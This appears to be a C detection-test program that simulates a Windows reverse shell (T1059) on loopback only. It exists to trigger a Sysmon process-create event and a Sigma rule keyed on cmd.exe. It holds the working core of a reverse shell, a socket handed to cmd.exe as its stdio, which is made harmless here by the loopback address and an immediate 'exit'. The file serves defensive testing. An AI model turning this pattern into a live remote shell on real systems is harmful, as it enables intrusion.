/* reverse_shell composite (T1059, Command and Scripting Interpreter).
 *
 * Detection target: Sysmon EID 1 (process create); the shipped Sigma rule keys
 * on `Image endswith \cmd.exe`. The reverse-shell shape is a shell process
 * whose standard handles are wired to a socket, but the detection fires on the
 * process creation alone -- independent of the stdio plumbing. Expected robust
 * across the Windows substrate matrix: Sysmon records the event-level fact that
 * cmd.exe was spawned, never the handle wiring where substrate differences
 * would live.
 *
 * Self-contained and benign: a loopback listener on 127.0.0.1:4444 stands in
 * for the operator's handler. The client socket is handed to cmd.exe as its
 * stdio; the listener immediately sends "exit\r\n", so the shell reads its own
 * exit command and terminates. No external host, no interactive shell left
 * running. Exits 0 once the child has been reaped. */
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

int main(void) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }

    SOCKET lst = INVALID_SOCKET, cli = INVALID_SOCKET, srv = INVALID_SOCKET;
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof pi);
    int rc = 1;

    do {
        struct sockaddr_in addr;
        ZeroMemory(&addr, sizeof addr);
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        addr.sin_port = htons(4444);

        lst = socket(AF_INET, SOCK_STREAM, 0);
        if (lst == INVALID_SOCKET) break;
        if (bind(lst, (struct sockaddr *)&addr, sizeof addr) != 0) break;
        if (listen(lst, 1) != 0) break;

        /* Client socket -- this is the handle cmd.exe inherits as its stdio, so
         * it must be marked inheritable for CreateProcess to hand it over. A
         * blocking connect to the listening socket completes via the accept
         * backlog, so the whole exchange runs single-threaded. */
        cli = socket(AF_INET, SOCK_STREAM, 0);
        if (cli == INVALID_SOCKET) break;
        if (connect(cli, (struct sockaddr *)&addr, sizeof addr) != 0) break;

        srv = accept(lst, NULL, NULL);
        if (srv == INVALID_SOCKET) break;

        SetHandleInformation((HANDLE)cli, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

        STARTUPINFOA si;
        ZeroMemory(&si, sizeof si);
        si.cb = sizeof si;
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = (HANDLE)cli;
        si.hStdOutput = (HANDLE)cli;
        si.hStdError = (HANDLE)cli;

        if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL,
                            TRUE, 0, NULL, NULL, &si, &pi)) {
            break;
        }

        /* Feed the shell its own exit command down the socket so it terminates
         * cleanly instead of blocking on an interactive read. */
        const char bye[] = "exit\r\n";
        send(srv, bye, (int)(sizeof bye - 1), 0);

        WaitForSingleObject(pi.hProcess, 10000);
        rc = 0;
    } while (0);

    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
    if (srv != INVALID_SOCKET) closesocket(srv);
    if (cli != INVALID_SOCKET) closesocket(cli);
    if (lst != INVALID_SOCKET) closesocket(lst);
    WSACleanup();
    return rc;
}
